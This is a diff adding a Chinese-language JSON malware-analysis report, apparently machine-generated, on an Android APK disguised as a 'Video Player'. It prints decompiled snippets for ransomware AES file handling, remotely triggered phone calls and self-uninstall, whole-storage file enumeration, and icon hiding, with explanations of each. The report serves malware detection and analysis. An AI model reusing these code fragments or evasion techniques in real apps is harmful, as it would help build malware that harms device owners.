@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "a6dcd24d400f2b1a3c14da08cb5655f4ac16053adbad0550c338d35175fa51f6.apk",
+    "sha256": "a6dcd24d400f2b1a3c14da08cb5655f4ac16053adbad0550c338d35175fa51f6",
+    "包名": "co1m.andr53oid.gohpat",
+    "应用名": "Video Player",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 284.7
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lco1m\\andr53oid\\gohpat\\p;",
+          "method_signature": "if(Arrays.equals(bArr, p.b)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Arrays.equals(bArr, p.b)) {\n    fileOutputStream.getChannel().truncate(length);\n    Cipher cipher = Cipher.getInstance(\"AES/CBC\");\n    cipher.init(2, p.c, new IvParameterSpec(p.e));\n    BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new CipherOutputStream(new FileOutputStream(strReplace), cipher));\n    bufferedOutputStream.write(bArr2, 0, i);\n}",
+          "malicious_code_snippet_context": "                          if (length > -1) {\n                              fileInputStream.skip(length);\n                              fileInputStream.read(bArr, 0, p.b.length);\n>>>                             if (Arrays.equals(bArr, p.b)) {\n>>>                                 fileInputStream.close();\n>>>                                 FileOutputStream fileOutputStream = new FileOutputStream(str, true);\n>>>                                 fileOutputStream.getChannel().truncate(length);\n>>>                                 fileOutputStream.close();\n>>>                                 Cipher cipher = Cipher.getInstance(\"AES/CBC\");\n>>>                                 cipher.init(2, p.c, new IvParameterSpec(p.e));\n                                  byte[] bArr2 = new byte[1024];\n                                  BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(str));\n                                  Log.v(\"test\", \"in Work decrypt \" + str);",
+          "behavior_description": "该代码是勒索软件文件加密模块的解密分支：先读取用户文件末尾固定长度的字节，与内置勒索标记 p.b 比对（Arrays.equals），确认该文件已被本勒索软件加密；随后通过 FileChannel.truncate 截去尾部标记，再使用类 p 中硬编码的 AES 密钥 p.c 与 IV p.e，以 AES/CBC 模式初始化 Cipher（init(2,...) 为解密模式），通过 CipherOutputStream 将文件流式解密写入新文件。该解密例程与加密分支共用同一套密钥、IV 和文件标记常量，证明该 APK 具备对用户文件进行 AES 加密、附加勒索标记并按需解密的完整勒索软件能力（混淆包名 andr53oid 亦体现反检测意图）。数据流向：FileInputStream 读取用户文件尾部标记 → 标记匹配校验 → Cipher(AES/CBC) 解密 → FileOutputStream 写回文件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lco1m\\andr53oid\\gohpat\\p;",
+          "method_signature": "run()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "p.f.stopService(new Intent(p.f, Decrypt.class));\np.f.stopService(new Intent(p.f, LS.class));\np.f.stopService(new Intent(p.f, AndroidService.class));\nnew Handler().postDelayed(new Runnable() {\n    public void run() {\n        p.f.startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + p.f.getPackageName())).addFlags(268435456));\n    }\n}, 2000L);",
+          "malicious_code_snippet_context": "p.f.stopService(new Intent(p.f, Decrypt.class));\np.f.stopService(new Intent(p.f, LS.class));\np.f.stopService(new Intent(p.f, AndroidService.class));\nnew Handler().postDelayed(new Runnable() {\n    public void run() {\n        p.f.startActivity(new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + p.f.getPackageName())).addFlags(268435456));\n    }\n}, 2000L);",
+          "behavior_description": "该代码由 Monitor 指令 \"Delete\" 触发（疑似来自远程C2控制命令），首先依次停止应用自身的所有后台服务，然后通过 Handler 延迟2秒后，以 FLAG_ACTIVITY_NEW_TASK 标志发送 ACTION_DELETE Intent（目标为自身包名 getPackageName()），调起系统卸载界面实现应用自卸载/自毁。数据流向：远程控制指令→停止全部后台服务→startActivity(ACTION_DELETE) 卸载自身。这是恶意软件常见的自毁/清痕机制，用于恶意任务（如数据窃取）完成后删除自身以逃避检测和取证。注意：ACTION_DELETE 会弹出系统确认对话框，并非完全静默卸载，需用户确认，但在恶意上下文中仍属于远程控制的自毁行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lco1m\\andr53oid\\gohpat\\Mon53itor;",
+          "method_signature": "run()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "case \"Call\":\n    new Thread(new Runnable() {\n        public void run() {\n            Mon53itor.this.startActivity(new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + jSONObject.getString(\"number\"))).setFlags(268435456));\n        }\n    }).start();",
+          "malicious_code_snippet_context": "                                  break;\n                              }\n                              break;\n>>>                         case \"Call\":\n>>>                             new Thread(new Runnable() { // from class: co1m.andr53oid.gohpat.Mon53itor.3\n>>>                                 @Override // java.lang.Runnable\n>>>                                 public void run() {\n>>>                                     try {\n>>>                                         Mon53itor.this.startActivity(new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + jSONObject.getString(\"number\").replace(\"&quots;\", \"\\\"\"))).setFlags(268435456));\n                                      } catch (JSONException unused2) {\n                                      }\n                                  }",
+          "behavior_description": "该代码位于混淆类名（andr53oid/gohpat/Mon53itor，插入数字对抗静态分析）的Monitor监控组件中，属于远程指令分发逻辑（switch分支处理\"Call\"、\"Deleted\"等命令）。当收到远程C2服务器下发的JSON指令中的\"Call\"命令时，在子线程中提取\"number\"字段指定的电话号码，构造tel: URI并使用ACTION_CALL动作配合FLAG_ACTIVITY_NEW_TASK直接发起拨号。注意ACTION_CALL与ACTION_DIAL不同：ACTION_DIAL仅调起拨号界面需用户确认，而ACTION_CALL配合CALL_PHONE权限可绕过用户交互直接拨打电话，是远控木马(RAT)静默拨打高额付费号码、造成用户直接资费损失的典型恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lco1m\\andr53oid\\gohpat\\Android53Service;",
+          "method_signature": "if(c && b != null)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "arrayList = l.a(getApplicationInfo().dataDir, \"/\");\narrayList = l.a(getApplicationInfo().dataDir, Environment.getExternalStorageDirectory().getPath());\nif (arrayList == null || arrayList.isEmpty()) {\n    arrayList = l.a(getApplicationInfo().dataDir, \"/storage/\");\n}\nif (arrayList == null || arrayList.isEmpty()) {\n    arrayList = l.a(getApplicationInfo().dataDir, \"/sdcard/\");\n}",
+          "malicious_code_snippet_context": "          try {\n              ArrayList<String> arrayList = new ArrayList<>();\n              try {\n>>>                 arrayList = l.a(getApplicationInfo().dataDir, \"/\");\n>>>             } catch (Exception e3) {\n>>>                 Log.v(\"filesSS 23\", \"\" + e3 + \" directory \");\n>>>                 try {\n>>>                     arrayList = l.a(getApplicationInfo().dataDir, Environment.getExternalStorageDirectory().getPath());\n>>>                     if (arrayList == null || arrayList.isEmpty()) {\n>>>                         arrayList = l.a(getApplicationInfo().dataDir, \"/storage/\");\n>>>                     }\n                      if (arrayList == null || arrayList.isEmpty()) {\n                          arrayList = l.a(getApplicationInfo().dataDir, \"/sdcard/\");\n                      }",
+          "behavior_description": "该代码位于混淆类名的后台 Service（andr53oid 为反检测混淆）中，执行全盘文件枚举：先尝试从应用私有数据目录和根目录 \"/\" 递归收集文件列表，失败后依次降级尝试外部存储目录、/storage/ 和 /sdcard/ 路径，将所有文件路径收集到 ArrayList 中。这种多路径降级遍历是文件窃取型恶意软件的典型前置行为，目的是扫描用户设备上的文档、照片等文件以便后续外传窃取。数据流向：设备文件系统（应用数据目录/外部存储/SD卡）→ l.a() 递归遍历收集文件列表 → 汇入 ArrayList 供后续窃取上传使用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lco1m\\andr53oid\\gohpat\\Main53Activity;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "String packageName = getApplicationContext().getPackageName();\ngetApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".Main53Activity\"), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      private void a() {\n>>>         String packageName = getApplicationContext().getPackageName();\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".Main53Activity\"), 2, 1);\n      }\n  \n      private void b() {",
+          "behavior_description": "该方法通过 getApplicationContext().getPackageName() 获取自身包名，构造指向应用主入口 Activity（Main53Activity）的 ComponentName，随后调用 PackageManager.setComponentEnabledSetting() 并传入状态参数 2（COMPONENT_ENABLED_STATE_DISABLED）和标志 1（DONT_KILL_APP），将启动器入口组件禁用，导致应用图标从桌面消失。数据流向：getPackageName()（source）→ setComponentEnabledSetting 禁用主 Activity（sink）。结合同类的 b() 方法启动后台监控服务（Mon53itor、L53S），该行为使恶意样本在安装后隐藏自身图标，令用户难以发现和卸载，实现隐蔽驻留；类名中插入数字（Main53Activity/Mon53itor/L53S）的混淆特征进一步表明其规避检测的恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
